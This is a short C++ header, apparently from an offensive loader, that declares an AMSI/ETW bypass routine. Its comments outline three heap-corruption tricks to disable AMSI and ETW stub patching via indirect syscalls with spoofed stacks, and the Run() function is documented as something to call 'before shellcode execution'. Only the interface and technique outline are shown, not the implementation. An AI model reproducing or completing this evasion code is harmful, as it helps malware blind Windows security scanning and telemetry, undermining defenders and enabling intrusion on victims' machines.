#pragma once

// ============================================================================
// AMSI/ETW Bypass — Zero-Patch AMSI + Indirect Syscall ETW Patching
// ============================================================================
//
// AMSI: Three-layer zero-patch approach (no code patching, no VirtualProtect):
//   Layer 1 — Context signature corruption (heap data write)
//   Layer 2 — Provider list decapitation (heap data write)
//   Layer 3 — Session counter overflow (heap data write)
//
// ETW: Two-layer approach:
//   Layer 1 — EtwEventWrite/Ex + NtTraceEvent stub patching via indirect syscall
//   Layer 2 — Per-thread TEB instrumentation suppression
//
// All API resolution via PEB hashing. ETW memory protection changes go
// through Tartarus + SyscallManager (indirect syscalls with spoofed stacks).
// ============================================================================

namespace AmsiEtw {

    struct BypassResult {
        bool AmsiSuccess;       // AMSI context corrupted or not needed
        bool EtwSuccess;        // ETW stubs patched
        int  EtwFunctionsPatched;
        bool TebSuppressed;
    };

    // Run full AMSI + ETW bypass. Call before shellcode execution.
    // Safe to call multiple times (idempotent).
    BypassResult Run();

} // namespace AmsiEtw
